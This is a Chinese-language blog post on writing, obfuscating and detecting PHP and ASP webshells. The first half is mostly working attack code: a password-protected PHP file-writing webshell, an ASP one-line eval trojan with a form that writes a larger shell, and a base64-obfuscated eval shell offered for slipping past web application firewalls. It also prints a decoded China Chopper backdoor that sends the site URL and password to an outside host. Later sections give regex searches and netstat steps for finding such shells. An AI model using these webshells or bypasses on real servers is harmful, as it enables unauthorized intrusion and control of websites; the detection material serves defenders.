---
title: 一些脚本后门的分析、编写及绕过技巧
subtitle: 
summary: 
authors:
- admin
tags: ["webshell","upload","bypass"]
categories: ["Hack"]
date: "2017-05-20T00:00:00Z"
featured: false
draft: false

# Featured image
# To use, add an image named `featured.jpg/png` to your page's folder. 
image:
  caption: ""
  focal_point: ""

# Projects (optional).
#   Associate this post with one or more of your projects.
#   Simply enter your project's folder or file name without extension.
#   E.g. `projects = ["internal-project"]` references 
#   `content/project/deep-learning/index.md`.
#   Otherwise, set `projects = []`.
projects: []
---

## 0x00 PHP小马

表单中

- action属性为要提交的地址；
- PHP_SELF获取当前文件；
- DOCUMENT_ROOT获取当前运行脚本所在的文档根目录；
- textarea为多行文本输入框；

```php
<?
$path=$_POST['path'];
$data=$_POST['data'];
$file=fopen($path,"w+");
fwrite($file,$data);
fclose($file);
?>

<form action="" method="post">
读取当前文件路径：
<? echo $_SERVER['DOCUMENT_ROOT'].$_SERVER['PHP_SELF'];?></br>
保存路径：<input name="path" type="text" /><br>
写入内容：<br><textarea name="data" cols="90" rows="50"></textarea></br>
<input name="" type="submit" value="提交"/>
</form>
```

**有密码验证的PHP小马：**

```php
<html>
<head>
<title><?=$_SERVER['SERVER_NAME']?>的后门小马</title>
</head>
<?php
error_reporting(0);//不显示错误信息
$password="xiaoxian";
if ($_GET[pass]==$password){//判断输入的密码是否正确
    if ($_POST){
        $path=$_POST['path'];//从表单获取的上传的路径
        $data=$_POST['data'];//从表单获取的上传的内容
        $file=fopen($path,"w+");
        if(fwrite($file,$data))
            echo "Succeeded!";
        else
            echo "Failed!";
        fclose($file);
    }
    else{
        echo "xiaoma.php with password by xiaoxian";
    }
?><br><br>

服务器的IP地址和域名为:<?=$_SERVER['SERVER_NAME']?>(<?=@gethostbyname($_SERVER['SERVER_NAME'])?>)<br>
当前目录路径:
<?php echo $_SERVER['DOCUMENT_ROOT'].$_SERVER['PHP_SELF'];?></br>
<form action="" method="post">
保存路径:<input name="path" type="text" /><br>
保存内容:<br><textarea name="data" cols="90" rows="50"></textarea></br>
<input name="" type="submit" value="Submit"/>
</form>

<?php
 }else{ //输入密码错误时则一直在输入密码的界面
?>

<form action="" method="GET">
密码:<input type="password" name="pass" id="pass">
<input type="submit" name="login" value="Login in" /></form>
<?php } ?>
```

## 0x01 一句话木马实现原理和编写

**客户端：**

```text
<form action=http://10.10.10.144/1.asp method=post>
<textarea name=xiaoxian cols=120 rows=10 width=45>
set IP=server.CreateObject("Adodb.Stream")//建立流对象
IP.Open
IP.Type=2//以文本方式 
IP.CharSet="gb2312"//字体标准
IP.writetext request("newvalue")
IP.SaveToFile server.mappath("new.asp"),2//将木马内容以覆盖文件的方式写入new.asp，2就是已覆盖的方式
IP.Close
set IP=nothing//释放对象
response.redirect "new.asp"//转向new.asp
</textarea>
<textarea name=newvalue cols=120 rows=10 width=45>这里填生成木马的代码
</textarea><br><center><br>
<input type=submit value=提交>
</form>
```

**服务端中有文件1.asp，内容为：**

```text
<%execute request("xiaoxian")%>
```

表单的作用就是把表单里的内容提交到服务器端的1.asp文件，而1.asp即为一句话木马，会执行提交的内容。简单地说，就是构造两个表单,第一个表单里的代码是文件操作的代码(就是把第二个表单内的内容写入在当前目录下并命名为new.asp的这么一段操作的处理代码)那么第二个表单当然就是我们要写入的马了。第一个表单的名字和1.asp中的密码必须一样，而第二个表单的名字必须和IP.writetext request("newvalue") 里的newvalue一样。至此只要服务器有写的权限该表单所提交的大马内容就会被写入到new.asp中。即new.asp为我们的shell地址。

## 0x02 一句话木马如何绕过WAF实现上传

这时候进行编码即可下面的是一个简单的编码例子，复杂的到网上下载即可：

```php
<?php
$mt="JF9QT1NU";
$ojj="QGV2YWwole";
$hsa="Wydlele4aW";
$fnx="FveGlhbiddKTs=";
$zk=str_replace("d","","sdtdrd_redpdldadcde");
$ef=$zk("z","","zbazsze64_zdzeczodze");
$dva=$zk("p","","pcprpepaptpe_fpupnpcptpipopn");
$zvm=$dva('',$ef($zk("le","",$ojj.$mt.$hsa.$fnx)));
$zvm();
?>
```

## 0x03 中国菜刀一些技巧和后门分析

开启安全狗之后即使上传了一句话木马但是也是无法直接用菜刀连接的，将菜刀发送的信息通过Firefox的Hackbar来POST过去即可绕过。

具体的效果要看不同种类、不同版本的WAF了，这里使用的是最新版的安全狗因为还是被过滤了。当然网上也有过狗版的菜刀，但是本人使用的版本效果并不好。

如何检测菜刀是否存在后门？

使用WSockExpert软件或其它抓包软来来选择需要监听的“中国菜刀”程序，开始监听后，用菜刀连接Webshell进行一些操作，然后查看抓到的包，找到Send即发送包，其中的内容含有密码xiaoxian和加密过的内容，接着对里面的内容解码就是（这个是据说是官网下载的菜刀，但是确实没看到有后门）：

```php
@eval (base64_decode($_POST[z0]));
&z0=@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("->|");;$D=base64_decode($_POST["z1"]);$F=@opendir($D);if($F==NULL){echo("ERROR:// Path Not Found Or No Permission!");}else{$M=NULL;$L=NULL;while($N=@readdir($F)){$P=$D."/".$N;$T=@date("Y-m-d H:i:s",@filemtime($P));@$E=substr(base_convert(@fileperms($P),10,8),-4);$R="\t".$T."\t".@filesize($P)."\t".$E."
";if(@is_dir($P))$M.=$N."/".$R;else $L.=$N.$R;}echo $M.$L;@closedir($F);};echo("|<-");die();
&z1=@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("->C:\\wce\\
```

这是有后门的菜刀第一次解码的结果：

```php
@eval(base64_decode('aWYoJF9DT09LSUVbJ0x5a2UnXSE9MSl7c2V0Y29va2llKCdMeWtlJywxKTtAZmlsZSgnaHR0cDovL3d3dy5hcGkuY29tLmRlL0FwaS5waHA/VXJsPScuJF9TRVJWRVJbJ0hUVFBfSE9TVCddLiRfU0VSVkVSWydSRVFVRVNUX1VSSSddLicmUGFzcz0nLmtleSgkX1BPU1QpKTt9'));@ini_set("display_errors","0");@set_time_limit(0);@set_magic_quotes_runtime(0);echo("->|");;$D=dirname($_SERVER["SCRIPT_FILENAME"]);if($D=="")$D=dirname($_SERVER["PATH_TRANSLATED"]);$R="{$D}\t";if(substr($D,0,1)!="/"){foreach(range("A","Z")
 as 
$L)if(is_dir("{$L}:"))$R.="{$L}:";}$R.="\t";$u=(function_exists('posix_getegid'))?@posix_getpwuid(@posix_geteuid()):'';$usr=($u)?$u['name']:@get_current_user();$R.=php_uname();$R.="({$usr})";print
 $R;;echo("|<-");die();
```

将中间base64加密字段进行第二次解密：

```php
if($_COOKIE['Lyke']!=1){setcookie('Lyke',1);@file('http://www.api.com.de/Api.php?Url='.$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'].'&Pass='.key($_POST));}
```

可以看到这个菜刀明显存在后门。

另外，在X-Forwarded-For这里是值得怀疑的地方，因为这里的IP是别的地方的，网上还没找到关于这种情况是不是后门的相关内容。这个地方大家可以研究一下，个人觉得是比较隐蔽的后门吧，但是问题是我所用的几个版本的菜刀在X-Forwarded-For这里都是有这个别的地方的IP的。

## 0x04 Linux、Windows下查找菜刀一句话木马

Linux：

- - 使用egrep命令进行正则匹配
  - egrep -re ' <php\s\@eval[(]$*POST[.+][)];?' \*.php*

Windows：

- 通过findstr命令加上正则表达式搜索文件
- findstr /R "<php.\@eval[(]$_POST.*[)];?" *.php

若是asp一句话木马，则需要修改正则表达式即可：

- egrep -re '[[]\%\@\sPage\sLanguage=.Jscript.\%[](mailto:]/%/@/sPage/sLanguage=.Jscript./%[)][<]\%eval.Request.Item.+unsafe' *.aspx
- findstr /R "[[]\%\@.Page.Language=.Jscript.\%[](mailto:]/%/@.Page.Language=.Jscript./%[)][<]\%eval.Request.Item.*unsafe" *.aspx

## 0x05 其他脚本后门分析

一般的方法就是，通过Firefox的F12即开发者工具到Network网络查看，如果在URL下还有访问其它网页的信息，那么基本就是存在后门。

## 0x06 手动查找后门木马

1、系统的启动项，在运行输入msconfig，在打开的系统配置实用程序里的启动列表查看，并且服务也要注意一下，可以使用360安全卫士等软件的开机加速功能，来查看有无异常的可以启动项和服务项，因为在后门木马中99%都会注册自己为系统服务，达到开机自启动的目的，如果发现可疑项直接打开相应的路径，找到程序文件，直接删除并且禁止自启动；

2、查看系统关键目录system32和系统安装目录Windows下的文件。然后查看最新修改的文件中有没有可疑的可执行文件或dll文件，这两个地方都是木马最喜欢的藏身的地方了（记得先设置显示所有的文件和文件夹）；

3、观察网络连接是否存在异常，还有输入netstat -ano命令查看有没有可疑或非正常程序的网络连接，尤其注意一下远程连接的端口，如果有类似于8000等端口就要注意了，8000是灰鸽子的默认端口。

这里重点讲一下第三点：

1、 查看进程：

```text
netstat-an
```

netstat -ano 多显示一个PID，先查看established的进程中所连接的外部地址是否是一个可疑的、没见过的地址，如果本身主机没有进行什么网络访问的话就需要警惕了，先记住这个可疑进程的PID。

tasklist /svc，输入这个命令，通过对应的PID找到对应的进程名。

2、 查看服务：

可以使用工具XueTr来进行更为简便的操作，使用其查看服务和进程等信息（注意的一点，微软服务的描述在最后都是由句号的，而第三方的服务是没有的）

先右键到dll文件的路径中将dll文件删除，然后到相应的服务中将其删除掉，最后将可疑进程终止掉。